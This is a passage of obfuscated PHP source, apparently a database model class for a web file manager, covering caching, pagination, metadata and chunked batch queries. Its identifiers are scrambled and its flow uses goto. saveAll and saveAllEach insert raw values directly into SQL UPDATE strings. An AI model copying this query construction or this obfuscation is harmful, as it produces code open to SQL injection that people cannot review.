_callBefore($D…ôó¢ , $C‰¶ÔˆÁé´) { return $this->cacheCallCheck($D…ôó¢ , $C‰¶ÔˆÁé´, !1); } protected function _callAfter($cÅàÀô‰‹‹, $c¸†Ä²’ğÔ) { return $this->cacheCallCheck($cÅàÀô‰‹‹, $c¸†Ä²’ğÔ, !0); } protected function cacheFunctionAlias($DéÌ…¦†ò˜) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($b§®È«®³, $AÛÖ¢¢®¶İ, $eÓÕ«­Ğ¡Æ = false) { $d†ŸªŠàŞÓ = $this->cacheFunctionAlias($AÛÖ¢¢®¶İ); if (!$d†ŸªŠàŞÓ) { return; } foreach ($d†ŸªŠàŞÓ as $eÀ‹”²‰ù => $AŸæ¬ÎåÖ½) { $eŒ¾¢ÛÄä¥ = $AŸæ¬ÎåÖ½[0]; $b›„º‘Ù = explode($_SERVER[“][47], $AŸæ¬ÎåÖ½[1]); if ($b§®È«®³ == $eÀ‹”²‰ù) { return $this->cacheFunctionGet($eÀ‹”²‰ù, $eŒ¾¢ÛÄä¥); } if ($eÓÕ«­Ğ¡Æ && in_array($b§®È«®³, $b›„º‘Ù)) { $this->cacheFunctionClear($eÀ‹”²‰ù, $eŒ¾¢ÛÄä¥); } } } public function cacheFunctionGet($b­«„Í¨“¡, $E¹œŸÈ¯ŠÕ) { $BÏâ™‘£Ç  = $this->cacheKeyMake($b­«„Í¨“¡, $E¹œŸÈ¯ŠÕ); $DÑìÚ¦Ê‡Š = Cache::get($BÏâ™‘£Ç ); if (!is_array($DÑìÚ¦Ê‡Š)) { $DÑìÚ¦Ê‡Š = call_user_func_array(array($this, $b­«„Í¨“¡), array($E¹œŸÈ¯ŠÕ, !0)); Cache::set($BÏâ™‘£Ç , $DÑìÚ¦Ê‡Š); } return $DÑìÚ¦Ê‡Š; } public function cacheFunctionClear($d´¦¼¶ô„Ñ, $AªÇÚ‹¢) { $AêòÑ£Œƒ‚ = $AªÇÚ‹¢; if (!is_array($AªÇÚ‹¢)) { $AêòÑ£Œƒ‚ = array($AªÇÚ‹¢); } foreach ($AêòÑ£Œƒ‚ as $dœ¸—ŸŒ©•) { $BÄËêºŸÉŸ = $this->cacheKeyMake($d´¦¼¶ô„Ñ, $dœ¸—ŸŒ©•); Cache::remove($BÄËêºŸÉŸ); } } private function cacheKeyMake($dá½ˆ‘¹²£, $e¨õËÑ´´´) { $aµêŸ˜ªÈ‡ =& $_SERVER[“]; return get_class($this) . $aµêŸ˜ªÈ‡[70] . $dá½ˆ‘¹²£ . $aµêŸ˜ªÈ‡[348] . $e¨õËÑ´´´; } protected function selectPage($bË¶¸ÖÈÁÖ = 200, $D˜ï®ŞğÆ¹ = 1) { goto B’­ŠçÒí; CèÈÑ—…•: $CÁ˜ØÎ«‹Ë = intval($this->count()); $bË¶¸ÖÈÁÖ = intval($bË¶¸ÖÈÁÖ); $bË¶¸ÖÈÁÖ = $bË¶¸ÖÈÁÖ <= 5 ? 5 : ($bË¶¸ÖÈÁÖ >= $a±ğ‚–ã‚ ? $a±ğ‚–ã‚ : $bË¶¸ÖÈÁÖ); goto DÇ»å”‚ï; B’­ŠçÒí: $aä–“ÇƒÙ÷ =& $_SERVER[“]; global $in; $FÙŞ¹îƒß = $this->optionsValue(); goto D‚îÇÅ—; D‚îÇÅ—: $a±ğ‚–ã‚ = 4000; $bË¶¸ÖÈÁÖ = isset($in[$aä–“ÇƒÙ÷[349]]) ? $in[$aä–“ÇƒÙ÷[349]] : $bË¶¸ÖÈÁÖ; if ($bË¶¸ÖÈÁÖ === -1) { unset($in[$aä–“ÇƒÙ÷[349]]); $a±ğ‚–ã‚ = 100000000; $bË¶¸ÖÈÁÖ = $a±ğ‚–ã‚; } goto b¨×’¸¨—ß; b¨×’¸¨—ß: $EÏ¿ÅïÌô = $FÙŞ¹îƒß; $EÏ¿ÅïÌô[$aä–“ÇƒÙ÷[350]] = array(); $this->optionsValue($EÏ¿ÅïÌô); goto CèÈÑ—…•; DÇ»å”‚ï: $cÀ‚ö°é„  = ceil($CÁ˜ØÎ«‹Ë / $bË¶¸ÖÈÁÖ); $D˜ï®ŞğÆ¹ = intval(isset($in[$aä–“ÇƒÙ÷[340]]) ? $in[$aä–“ÇƒÙ÷[340]] : $D˜ï®ŞğÆ¹); $D˜ï®ŞğÆ¹ = $D˜ï®ŞğÆ¹ <= 1 ? 1 : ($D˜ï®ŞğÆ¹ >= $cÀ‚ö°é„  ? $cÀ‚ö°é„  : $D˜ï®ŞğÆ¹); goto A¬ø‹·İ; A¬ø‹·İ: $this->optionsValue($FÙŞ¹îƒß); $C—“é„«ê = $this->page($D˜ï®ŞğÆ¹, $bË¶¸ÖÈÁÖ)->select(); $C—“é„«ê = is_array($C—“é„«ê) ? $C—“é„«ê : array(); goto dõ‚ Ò˜é; dõ‚ Ò˜é: if ($cÀ‚ö°é„  == 1) { $CÁ˜ØÎ«‹Ë = count($C—“é„«ê); } $f»×İ·¢ = array($aä–“ÇƒÙ÷[351] => array($aä–“ÇƒÙ÷[352] => $CÁ˜ØÎ«‹Ë, $aä–“ÇƒÙ÷[349] => $bË¶¸ÖÈÁÖ, $aä–“ÇƒÙ÷[340] => $D˜ï®ŞğÆ¹, $aä–“ÇƒÙ÷[353] => $cÀ‚ö°é„ ), $aä–“ÇƒÙ÷[354] => $C—“é„«ê ? $C—“é„«ê : array()); return $f»×İ·¢; goto c›ĞİªåÄâ; c›ĞİªåÄâ: } protected function checkLength($f‡Š“ªµÕ¯, $dØ¶Œ¹¾É† = 0, $C¹ÏÃÉãÛ” = '') { $Cº¶Ú†™í =& $_SERVER[“]; $dØ¶Œ¹¾É† = $dØ¶Œ¹¾É† ? $dØ¶Œ¹¾É† : 65536; if (!$f‡Š“ªµÕ¯ || strlen($f‡Š“ªµÕ¯) < $dØ¶Œ¹¾É†) { return; } $C¹ÏÃÉãÛ” = $C¹ÏÃÉãÛ” ? $C¹ÏÃÉãÛ” . $Cº¶Ú†™í[67] : $Cº¶Ú†™í[33]; show_json($C¹ÏÃÉãÛ” . LNG($Cº¶Ú†™í[355]) . "\x28{$dØ¶Œ¹¾É†}\x29", !1); } protected function metaSet($e¹±‡Ö¿ùÉ, $C†ÚÅ…¾¬® = null, $Eí®“ÕôÑ• = null) { goto BÔ˜•”éìİ; bô¾ÒÅï‰ğ: $AÃ¸ßëÕ¿Ø->where(array($bÚãäÔ†ëÊ => $e¹±‡Ö¿ùÉ))->addAll($B„ì‰Éšç‹, array(), !0); return !0; goto f«›Ï³ŠÛï; f¨¥æÜÄ³õ: $eÃ£Îç¯ = $this->tableMeta[$AÖÕØßóêÆ[357]]; $AÃ¸ßëÕ¿Ø = Model($eÃ£Îç¯); $Dõ‡õ¸á = array($bÚãäÔ†ëÊ => $e¹±‡Ö¿ùÉ, $AÖÕØßóêÆ[358] => $C†ÚÅ…¾¬®); goto D“íËÄ×†; BÔ˜•”éìİ: $AÖÕØßóêÆ =& $_SERVER[“]; if (!$this->tableMeta) { return !1; } $bÚãäÔ†ëÊ = $this->tableMeta[$AÖÕØßóêÆ[356]]; goto f¨¥æÜÄ³õ; C“œ“À²ÒÏ: if (is_string($C†ÚÅ…¾¬®)) { $e‚¯ÎÊ·ëÑ[$C†ÚÅ…¾¬®] = $Eí®“ÕôÑ•; } $B„ì‰Éšç‹ = array(); foreach ($e‚¯ÎÊ·ëÑ as $C œ†Â„•ë => $D‰„â©á–Ş) { $this->checkLength($D‰„â©á–Ş, !1, $eÃ£Îç¯ . $AÖÕØßóêÆ[4] . $C œ†Â„•ë); $B„ì‰Éšç‹[] = array($bÚãäÔ†ëÊ => $e¹±‡Ö¿ùÉ, $AÖÕØßóêÆ[89] => $C œ†Â„•ë, $AÖÕØßóêÆ[359] => $D‰„â©á–Ş); } goto bô¾ÒÅï‰ğ; D“íËÄ×†: if (is_null($C†ÚÅ…¾¬®)) { return $AÃ¸ßëÕ¿Ø->where(array($bÚãäÔ†ëÊ => $e¹±‡Ö¿ùÉ))->delete(); } if (is_null($Eí®“ÕôÑ•) && is_string($C†ÚÅ…¾¬®)) { return $AÃ¸ßëÕ¿Ø->where($Dõ‡õ¸á)->delete(); } $e‚¯ÎÊ·ëÑ = is_array($C†ÚÅ…¾¬®) ? $C†ÚÅ…¾¬® : array(); goto C“œ“À²ÒÏ; f«›Ï³ŠÛï: } public function metaGet($e´¹¼Ëôî­, $b™‹¥ŠÛ† = false) { goto E°×–†…ÊŸ; A¯ƒİ˜¨Í¤: $BŸ›ÔÓ¦‚Ñ = $DšçôÉ§˜¶->field($Fõ¢¤‰ØØ‘[360])->where($BÃš‘å¥¥³)->select(); $BŸ›ÔÓ¦‚Ñ = array_to_keyvalue($BŸ›ÔÓ¦‚Ñ, $Fõ¢¤‰ØØ‘[89], $Fõ¢¤‰ØØ‘[359]); return $BŸ›ÔÓ¦‚Ñ; goto bå„ÇÈÒ«˜; AÅ‚÷ˆÆ†¶: $DšçôÉ§˜¶ = Model($this->tableMeta[$Fõ¢¤‰ØØ‘[357]]); if ($b™‹¥ŠÛ†) { $BÃš‘å¥¥³ = array($C´‹ô°Ë => $e´¹¼Ëôî­, $Fõ¢¤‰ØØ‘[89] => $b™‹¥ŠÛ†); return $DšçôÉ§˜¶->where($BÃš‘å¥¥³)->getField($Fõ¢¤‰ØØ‘[359]); } $BÃš‘å¥¥³ = array($C´‹ô°Ë => $e´¹¼Ëôî­); goto A¯ƒİ˜¨Í¤; E°×–†…ÊŸ: $Fõ¢¤‰ØØ‘ =& $_SERVER[“]; if (!$this->tableMeta) { return array(); } $C´‹ô°Ë = $this->tableMeta[$Fõ¢¤‰ØØ‘[356]]; goto AÅ‚÷ˆÆ†¶; bå„ÇÈÒ«˜: } private function checkDataAutoHas($fÍ•™…É) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $AÚà ’É˜¡) { if (in_array($fÍ•™…É, explode($_SERVER[“][47], $AÚà ’É˜¡[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$eÅÊÛõ¸ö, $F›³İ¸òê) { $aÆ¥¿«¬‘Ñ =& $_SERVER[“]; foreach ($this->dataAuto as $AĞ«“Ï¬Ğ®) { $dè˜Ñ ôÒÏ = $AĞ«“Ï¬Ğ®[0]; if (!in_array($F›³İ¸òê, explode($aÆ¥¿«¬‘Ñ[47], $AĞ«“Ï¬Ğ®[2]))) { continue; } switch (trim($AĞ«“Ï¬Ğ®[3])) { case $aÆ¥¿«¬‘Ñ[309]: case $aÆ¥¿«¬‘Ñ[310]: $C³²Ú§‡â = $AĞ«“Ï¬Ğ®[1]; $f¸óó›Ééä = isset($AĞ«“Ï¬Ğ®[4]) ? (array) $AĞ«“Ï¬Ğ®[4] : array(); if ($C³²Ú§‡â == $aÆ¥¿«¬‘Ñ[190] && array_key_exists($dè˜Ñ ôÒÏ, $eÅÊÛõ¸ö)) { if (!$eÅÊÛõ¸ö[$dè˜Ñ ôÒÏ]) { unset($eÅÊÛõ¸ö[$dè˜Ñ ôÒÏ]); } break; } if (isset($eÅÊÛõ¸ö[$dè˜Ñ ôÒÏ])) { array_unshift($f¸óó›Ééä, $eÅÊÛõ¸ö[$dè˜Ñ ôÒÏ]); } if ($aÆ¥¿«¬‘Ñ[309] == $AĞ«“Ï¬Ğ®[3]) { $eÅÊÛõ¸ö[$dè˜Ñ ôÒÏ] = call_user_func_array($C³²Ú§‡â, $f¸óó›Ééä); } else { $eÅÊÛõ¸ö[$dè˜Ñ ôÒÏ] = call_user_func_array(array(&$this, $C³²Ú§‡â), $f¸óó›Ééä); } break; case $aÆ¥¿«¬‘Ñ[261]: $eÅÊÛõ¸ö[$dè˜Ñ ôÒÏ] = $eÅÊÛõ¸ö[$AĞ«“Ï¬Ğ®[1]]; break; case $aÆ¥¿«¬‘Ñ[282]: if (isset($eÅÊÛõ¸ö[$dè˜Ñ ôÒÏ]) && !is_string($eÅÊÛõ¸ö[$dè˜Ñ ôÒÏ])) { $eÅÊÛõ¸ö[$dè˜Ñ ôÒÏ] = json_encode_force($eÅÊÛõ¸ö[$dè˜Ñ ôÒÏ]); } break; case $aÆ¥¿«¬‘Ñ[311]: if ($eÅÊÛõ¸ö[$dè˜Ñ ôÒÏ] === $aÆ¥¿«¬‘Ñ[33]) { unset($eÅÊÛõ¸ö[$dè˜Ñ ôÒÏ]); } break; case $aÆ¥¿«¬‘Ñ[312]: $eÅÊÛõ¸ö[$dè˜Ñ ôÒÏ] = $AĞ«“Ï¬Ğ®[1]; default: break; } } if ($F›³İ¸òê == $aÆ¥¿«¬‘Ñ[344]) { $F‹Ü¸ŸøÆÈ = strtolower($this->db->getDbType()); if (strpos($F‹Ü¸ŸøÆÈ, $aÆ¥¿«¬‘Ñ[9]) !== 0) { return; } $fµÚô–ÍŒˆ = $this->field(!0)->fields; $BÂ’ôùÑ×… = $fµÚô–ÍŒˆ[$aÆ¥¿«¬‘Ñ[240]]; if (isset($fµÚô–ÍŒˆ[$aÆ¥¿«¬‘Ñ[239]])) { unset($BÂ’ôùÑ×…[$fµÚô–ÍŒˆ[$aÆ¥¿«¬‘Ñ[239]]]); } foreach ($BÂ’ôùÑ×… as $d» ·‡²Š» => $F›³İ¸òê) { if (!isset($eÅÊÛõ¸ö[$d» ·‡²Š»])) { $eÅÊÛõ¸ö[$d» ·‡²Š»] = $aÆ¥¿«¬‘Ñ[33]; } } } } private function dataAfterFilter(&$B¾ª¨”Œò¹) { $B®áˆ·„ =& $_SERVER[“]; foreach ($this->dataAuto as $d‘İìÀŞ³) { $b‡äïÂÃ¥ = $d‘İìÀŞ³[0]; if (!in_array($B®áˆ·„[346], explode($B®áˆ·„[47], $d‘İìÀŞ³[2]))) { continue; } if (!isset($B¾ª¨”Œò¹[$b‡äïÂÃ¥])) { continue; } switch (trim($d‘İìÀŞ³[3])) { case $B®áˆ·„[309]: case $B®áˆ·„[310]: $fƒä©ÏÈˆ = isset($d‘İìÀŞ³[4]) ? (array) $d‘İìÀŞ³[4] : array(); array_unshift($fƒä©ÏÈˆ, $B¾ª¨”Œò¹[$b‡äïÂÃ¥]); if ($B®áˆ·„[309] == $d‘İìÀŞ³[3]) { $B¾ª¨”Œò¹[$b‡äïÂÃ¥] = call_user_func_array($d‘İìÀŞ³[1], $fƒä©ÏÈˆ); } else { $B¾ª¨”Œò¹[$b‡äïÂÃ¥] = call_user_func_array(array(&$this, $d‘İìÀŞ³[1]), $fƒä©ÏÈˆ); } break; case $B®áˆ·„[261]: $B¾ª¨”Œò¹[$b‡äïÂÃ¥] = $B¾ª¨”Œò¹[$d‘İìÀŞ³[1]]; break; case $B®áˆ·„[282]: $Aİî†­ÕÅ = $B¾ª¨”Œò¹[$b‡äïÂÃ¥]; $B¾ª¨”Œò¹[$b‡äïÂÃ¥] = json_decode($Aİî†­ÕÅ, !0); if (is_null($B¾ª¨”Œò¹[$b‡äïÂÃ¥])) { $B¾ª¨”Œò¹[$b‡äïÂÃ¥] = $Aİî†­ÕÅ; } break; case $B®áˆ·„[311]: if ($B¾ª¨”Œò¹[$b‡äïÂÃ¥] === $B®áˆ·„[33]) { unset($B¾ª¨”Œò¹[$b‡äïÂÃ¥]); } break; case $B®áˆ·„[312]: $B¾ª¨”Œò¹[$b‡äïÂÃ¥] = $d‘İìÀŞ³[1]; default: break; } } } public function saveAll($B¢ÔÒæ¼«Ç) { goto c³Ş¼±ÎäĞ; fç·†å¢àÊ: $fê«–Ãò” = array(); $CÈÒùº©åĞ = count($B¢ÔÒæ¼«Ç); for ($f¾Ó•­× = 0; $f¾Ó•­× < $CÈÒùº©åĞ; $f¾Ó•­×++) { $DĞˆêµÀ = $B¢ÔÒæ¼«Ç[$f¾Ó•­×]; if (!is_array($DĞˆêµÀ) || count($DĞˆêµÀ) != 4) { continue; } $dÈ˜›„ø†ğ = "\x55\x50\x44\101\x54\105\40\x60{$fÙœ»‰ª›¸}\140\40\123\105\x54\x20{$DĞˆêµÀ[2]}\40\75\x20\x43\101\x53\x45\40{$DĞˆêµÀ[0]}\40\xa"; if ($CÛö¯®ƒ¢ == 0) { $d§ã¸İò„æ = $dÈ˜›„ø†ğ; } $fê«–Ãò”[] = $Aäìà®¥¥æ[113] . $DĞˆêµÀ[1] . $Aäìà®¥¥æ[113]; $CÛö¯®ƒ¢++; $d§ã¸İò„æ .= "\40\127\110\x45\x4e\40\47{$DĞˆêµÀ[1]}\47\40\124\110\x45\116\40\x27{$DĞˆêµÀ[3]}\x27\x20\xa"; if ($CÛö¯®ƒ¢ == $A„“Ï–­¾ || $f¾Ó•­× == $CÈÒùº©åĞ - 1) { goto DÆ‰Éùë…Ë; B’İÁÌ½ĞÄ: $fê«–Ãò” = array(); goto eÌµïİÈ¼; B—ì‡¿õ¸Ï: $CÛö¯®ƒ¢ = 0; $d§ã¸İò„æ = $dÈ˜›„ø†ğ; $this->chunkEventCheck(count($fê«–Ãò”)); goto B’İÁÌ½ĞÄ; DÆ‰Éùë…Ë: $Cø¾Œã“ø = implode($Aäìà®¥¥æ[47], $fê«–Ãò”); $d§ã¸İò„æ .= "\x20\105\116\104\40\x20\127\x48\105\x52\x45\x20{$DĞˆêµÀ[0]}\40\111\116\40\x28{$Cø¾Œã“ø}\51\x20"; $this->execute($d§ã¸İò„æ); goto B—ì‡¿õ¸Ï; eÌµïİÈ¼: } } goto EˆŒàĞŒ®; EˆŒàĞŒ®: $this->chunkEventSet(); goto bˆœİ¤ÁÓ; c³Ş¼±ÎäĞ: $Aäìà®¥¥æ =& $_SERVER[“]; $fÙœ»‰ª›¸ = $this->tablePrefix . $this->tableName; $A„“Ï–­¾ = self::SQL_WHERE_IN_CHUNK; goto Aäôƒ¨Çæî; Aäôƒ¨Çæî: $B¢ÔÒæ¼«Ç = is_array($B¢ÔÒæ¼«Ç) ? $B¢ÔÒæ¼«Ç : array(); $d§ã¸İò„æ = $Aäìà®¥¥æ[361]; $CÛö¯®ƒ¢ = 0; goto fç·†å¢àÊ; bˆœİ¤ÁÓ: } public function saveAllEach($c«ÓŠæ¹ğ¿) { $EĞ„Ö›¢„ =& $_SERVER[“]; $A…À‰É²®Ü = $this->tablePrefix . $this->tableName; foreach ($c«ÓŠæ¹ğ¿ as $CÓ„ÏÎÇšß) { if (!is_array($CÓ„ÏÎÇšß) || count($CÓ„ÏÎÇšß) != 4) { continue; } $B»šÉ¾Šè = $CÓ„ÏÎÇšß[0] . $EĞ„Ö›¢„[362] . $CÓ„ÏÎÇšß[1] . $EĞ„Ö›¢„[113]; $fº„†ôŒø› = $CÓ„ÏÎÇšß[2] . $EĞ„Ö›¢„[362] . $CÓ„ÏÎÇšß[3] . $EĞ„Ö›¢„[113]; $b‡ì¢åõŸÌ = "\x75\160\144\141\164\145\x20{$A…À‰É²®Ü}\x20\163\145\164\x20{$fº„†ôŒø›}\x20\167\x68\x65\x72\x65\x20{$B»šÉ¾Šè}\73"; $this->execute($b‡ì¢åõŸÌ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($dÙ‡ì¤¶™š = false, $cÁòÈ¥²¨‘ = false) { $this->_chunkEvent = $dÙ‡ì¤¶™š; $this->_chunkEventParam = $cÁòÈ¥²¨‘; } private function chunkEventCheck($E˜èôøŞÊœ) { if (!$this->_chunkEvent) { return; } $f¡ö®ÍÎ†› = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $f¡ö®ÍÎ†›[$_SERVER[“][363]] = $E˜èôøŞÊœ; Hook::trigger($this->_chunkEvent, $f¡ö®ÍÎ†›); } public function addAll($aÓ§´°æ‚§, $Aœ¶„äöØù = array(), $DæìÍòó¦í = false) { goto CöÜ‰ÀÑæ; CöÜ‰ÀÑæ: $aæ·Üè‚ñô =& $_SERVER[“]; ignore_timeout(); $D¡ †îÆ‹ = self::SQL_WHERE_IN_CHUNK; goto A¤•õœ¯­‡; cğ…©…†¤õ: if (method_exists($this->db, $aæ·Üè‚ñô[260])) { for ($Bï Â°ƒŠ = 0; $Bï Â°ƒŠ < count($aÓ§´°æ‚§); $Bï Â°ƒŠ += $D¡ †îÆ‹) { $C±¾Éõ‚¹’ = array_slice($aÓ§´°æ‚§, $Bï Â°ƒŠ, $D¡ †îÆ‹); if (!is_array($C±¾Éõ‚¹’) || count($C±¾Éõ‚¹’) == 0) { break; } $b—çÖ¥ÎáÑ = $this->db->insertAll($C±¾Éõ‚¹’, $Aœ¶„äöØù, $DæìÍòó¦í); $this->chunkEventCheck(count($C±¾Éõ‚¹’)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($aÓ§´°æ‚§ as $bÖë“¡˜“¼ => $bÂßÛ·…ê) { $b—çÖ¥ÎáÑ = $this->db->insert($bÂßÛ·…ê, $Aœ¶„äöØù, $DæìÍòó¦í); } $this->commit(); } if (!1 !== $b—çÖ¥ÎáÑ) { $DÅÙ•ÙÂÓÏ = $this->getLastInsID(); if ($DÅÙ•ÙÂÓÏ) { return $DÅÙ•ÙÂÓÏ; } } return $b—çÖ¥ÎáÑ; goto aà¢ÃÙ°ç; A¤•õœ¯­‡: if (empty($aÓ§´°æ‚§)) { $this->error = think_lang($aæ·Üè‚ñô[259]); return !1; } $Aœ¶„äöØù = $this->_parseOptions($Aœ¶„äöØù); foreach ($aÓ§´°æ‚§ as $bÖë“¡˜“¼ => $bÂßÛ·…ê) { $aÓ§´°æ‚§[$bÖë“¡˜“¼] = $this->_facade($bÂßÛ·…ê); $this->_beforeInsert($aÓ§´°æ‚§[$bÖë“¡˜“¼], $Aœ¶„äöØù); } goto cğ…©…†¤õ; aà¢ÃÙ°ç: } public function save($AÈîÚÂˆ¨ã = '', $E’ó‘‹ß±ù = array()) { goto f—ˆ’…“å«; FóÈ¢ˆ™Š…: $Cƒ‚©ŸÁÒÍ = $AÌÈ¼Ãí†Ü[$A§âµÂ¶…[263]][$aè‘»šİ¢¾][1]; $Cƒ‚©ŸÁÒÍ = is_array($Cƒ‚©ŸÁÒÍ) ? $Cƒ‚©ŸÁÒÍ : array(); $DØ„³¼­á± = count($Cƒ‚©ŸÁÒÍ); goto aô¾¡‰¡ï; Ağ…ŸÓÆ‹Ê: $aè‘»šİ¢¾ = $this->findWhereField($AÌÈ¼Ãí†Ü); if (!$aè‘»šİ¢¾) { return parent::save($AÈîÚÂˆ¨ã, $E’ó‘‹ß±ù); } $EÍéà†ÚÜœ = 0; goto FóÈ¢ˆ™Š…; f—ˆ’…“å«: $A§âµÂ¶… =& $_SERVER[“]; $eÆùè±‚ì = self::SQL_WHERE_IN_CHUNK; $AÌÈ¼Ãí†Ü = $this->optionsValue(); goto Ağ…ŸÓÆ‹Ê; aô¾¡‰¡ï: for ($CÕ™÷ˆ†Åè = 0; $CÕ™÷ˆ†Åè < $DØ„³¼­á±; $CÕ™÷ˆ†Åè += $eÆùè±‚ì) { $f¢õ¥šµ³à = array_slice($Cƒ‚©ŸÁÒÍ, $CÕ™÷ˆ†Åè, $eÆùè±‚ì); if (!is_array($f¢õ¥šµ³à) || count($f¢õ¥šµ³à) == 0) { break; } $AÌÈ¼Ãí†Ü[$A§âµÂ¶…[263]][$aè‘»šİ¢¾][1] = $f¢õ¥šµ³à; $this->optionsValue($AÌÈ¼Ãí†Ü); $EÍéà†ÚÜœ += parent::save($AÈîÚÂˆ¨ã, $E’ó‘‹ß±ù); $this->chunkEventCheck(count($f¢õ¥šµ³à)); } $this->chunkEventSet(); return $EÍéà†ÚÜœ; goto fÒˆâİ‰Áß; fÒˆâİ‰Áß: } public function add($aÀôÜ²‡ª = '', $c†§øÕÒÏº = array(), $B¼Ú…—«¤ = false) { if ($this->addTaskStatus && is_array($aÀôÜ²‡ª)) { $this->addTaskData[] = $aÀôÜ²‡ª; return; } return parent::add($aÀôÜ²‡ª, $c†§øÕÒÏº, $B¼Ú…—«¤); } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($F…˜Ø‚ÆÌÛ = array()) { goto dÛ§Ã˜ƒ­; B§ìŠÕÕ: $a–ƒ¶Ó˜É‡ = $this->findWhereField($bƒ´Øªß©“); if (!$a–ƒ¶Ó˜É‡ || isset($bƒ´Øªß©“[$Fñº»ùİÓ[280]]) || isset($bƒ´Øªß©“[$Fñº»ùİÓ[340]])) { return parent::select($F…˜Ø‚ÆÌÛ); } $aØ‰Š’Ó‡‚ = $bƒ´Øªß©“[$Fñº»ùİÓ[263]][$a–ƒ¶Ó˜É‡][1]; goto E—í¢îñŞé; c§Å Ü…‘š: return $DÁÇîå”É; goto A÷Í‰å¦Šé; E—í¢îñŞé: $aØ‰Š’Ó‡‚ = is_array($aØ‰Š’Ó‡‚) ? $aØ‰Š’Ó‡‚ : array(); $DÁÇîå”É = null; for ($A‘¬î²¸™É = 0; $A‘¬î²¸™É < count($aØ‰Š’Ó‡‚); $A‘¬î²¸™É += $eÅÃÄ¯®Æ) { $B‹®‚„¤£ = array_slice($aØ‰Š’Ó‡‚, $A‘¬î²¸™É, $eÅÃÄ¯®Æ); if (!is_array($B‹®‚„¤£) || count($B‹®‚„¤£) == 0) { break; } $bƒ´Øªß©“[$Fñº»ùİÓ[263]][$a–ƒ¶Ó˜É‡][1] = $B‹®‚„¤£; $this->optionsValue($bƒ´Øªß©“); $c‡¶çå‹ô” = parent::select($F…˜Ø‚ÆÌÛ); if (!$c‡¶çå‹ô”) { continue; } if (is_null($DÁÇîå”É)) { $DÁÇîå”É = array(); } $DÁÇîå”É = array_merge($DÁÇîå”É, $c‡¶çå‹ô”); } goto c§Å Ü…‘š; dÛ§Ã˜ƒ­: $Fñº»ùİÓ =& $_SERVER[“]; $eÅÃÄ¯®Æ = self::SQL_WHERE_IN_CHUNK; $bƒ´Øªß©“ = $this->optionsValue(); goto B§ìŠÕÕ; A÷Í‰å¦Šé: } public function delete($d·ã‹ô±î = array()) { goto dÄà”Ç½ó„; eÚ¢œğ÷´ó: return $FÂ–”îÍã¶; goto A‰‘¤£äé­; c´÷±ºÙÈ: $C®°“èí‚À = $this->findWhereField($A‚®ÎëÙ­Ö); if (!$C®°“èí‚À) { return parent::delete($d·ã‹ô±î); } $FÂ–”îÍã¶ = 0; goto e”ÖàÂ¨ŠŠ; dÄà”Ç½ó„: $CŸ¬Œ‹¬°´ =& $_SERVER[“]; $aÃá‹éƒŞ = self::SQL_WHERE_IN_CHUNK; $A‚®ÎëÙ­Ö = $this->optionsValue(); goto c´÷±ºÙÈ; e”ÖàÂ¨ŠŠ: $Fæ­œŠ‚œ… = $A‚®ÎëÙ­Ö[$CŸ¬Œ‹¬°´[263]][$C®°“èí‚À][1]; $Fæ­œŠ‚œ… = is_array($Fæ­œŠ‚œ…) ? $Fæ­œŠ‚œ… : array(); for ($EÌ·Ïçå = 0; $EÌ·Ïçå < count($Fæ­œŠ‚œ…); $EÌ·Ïçå += $aÃá‹éƒŞ) { $AÒõøÇ»½ˆ = array_slice($Fæ­œŠ‚œ…, $EÌ·Ïçå, $aÃá‹éƒŞ); if (!is_array($AÒõøÇ»½ˆ) || count($AÒõøÇ»½ˆ) == 0) { break; } $A‚®ÎëÙ­Ö[$CŸ¬Œ‹¬°´[263]][$C®°“èí‚À][1] = $AÒõøÇ»½ˆ; $this->optionsValue($A‚®ÎëÙ­Ö); $FÂ–”îÍã¶ += parent::delete($d·ã‹ô±î); } goto eÚ¢œğ÷´ó; A‰‘¤£äé­: } private function findWhereField($b’‘Œé‚¼¿) { $CŠ„É‹†– =& $_SERVER[“]; $bÓÌö‹¥¤ = self::SQL_WHERE_IN_CHUNK; if (!is_array($b’‘Œé‚¼¿) || !is_array($b’‘Œé‚¼¿[$CŠ„É‹†–[263]])) { return !1; } foreach ($b’‘Œé‚¼¿[$CŠ„É‹†–[263]] as $E¿«ÎÍö›ß => $CÚË¢÷Ê·â) { if (is_array($CÚË¢÷Ê·â) && isset($CÚË¢÷Ê·â[0]) && is_string($CÚË¢÷Ê·â[0]) && strtolower($CÚË¢÷Ê·â[0]) == $CŠ„É‹†–[7] && is_array($CÚË¢÷Ê·â[1]) && count($CÚË¢÷Ê·â[1]) > $bÓÌö‹¥¤) { ignore_timeout(); return $E¿«ÎÍö›ß; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\171\x73\x74\x65\x6d\x4f\160\x74\x69\157\x6e"; public $field = array(); public function listData($cÎŞóí = false, $B´‡ŞÔªô‰ = "\155\157\144\151\146\171\x54\x69\155\145", $aä¡³áÄ’ = false) { $Eˆ¾‡¢ì‡¤ = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$Eˆ¾‡¢ì‡¤) { return $cÎŞóí ? null : array(); } if (!$cÎŞóí) { $Eˆ¾‡¢ì‡¤ = array_filter(array_values($Eˆ¾‡¢ì‡¤)); return array_sort_by($Eˆ¾‡¢ì‡¤, $B´‡ŞÔªô‰, $aä¡³áÄ’); } return $Eˆ¾‡¢ì‡¤[$_SERVER[“][364] . $cÎŞóí]; } public function insert($EÖµ“›¥Ôì) { goto eòåëè¿ê; eòåëè¿ê: $B¢ÕÜ…á…ˆ =& $_SERVER[“]; $EÖµ“›¥Ôì = array_field_key($EÖµ“›¥Ôì, $this->field); $AÔÛÕ•³ò = Model($this->modelType)->get($B¢ÕÜ…á…ˆ[365], $this->optionType . $B¢ÕÜ…á…ˆ[366]); goto F’å”Á¿; F’å”Á¿: $AÔÛÕ•³ò = $AÔÛÕ•³ò ? $AÔÛÕ•³ò : 0; $EÖµ“›¥Ôì[$B¢ÕÜ…á…ˆ[367]] = 